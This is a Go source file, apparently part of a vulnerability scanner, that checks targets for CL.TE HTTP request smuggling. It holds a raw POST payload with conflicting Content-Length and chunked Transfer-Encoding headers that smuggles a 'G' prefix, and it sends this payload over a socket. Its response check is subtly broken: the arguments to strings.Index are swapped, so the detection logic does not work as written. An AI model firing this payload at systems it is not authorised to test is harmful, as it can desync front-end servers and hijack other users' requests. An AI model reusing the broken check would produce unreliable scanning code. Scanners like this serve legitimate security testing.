package Smuggling

import (
	"github.com/hktalent/scan4all/lib/socket"
	"strings"
)

// send tow repeate
var ClTePayload = []string{`POST / HTTP/1.1
Host: %s
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G`}

func init() {
	for n, x := range ClTePayload {
		x = strings.ReplaceAll(x, "\n", "\r\n")
		ClTePayload[n] = x
	}
}

type ClTe struct {
}

func (r *ClTe) CheckResponse(body string) bool {
	return -1 < strings.Index("Unrecognized method GPOST", body)
}

func (r *ClTe) GetPayloads() *[]string {
	return &ClTePayload
}

func (r *ClTe) Check(rc *socket.CheckTarget) {
	for _, x := range ClTePayload {
		s := rc.SendOnePayload(x, 2)
		if r.CheckResponse(s) {
			break
		}
	}
}
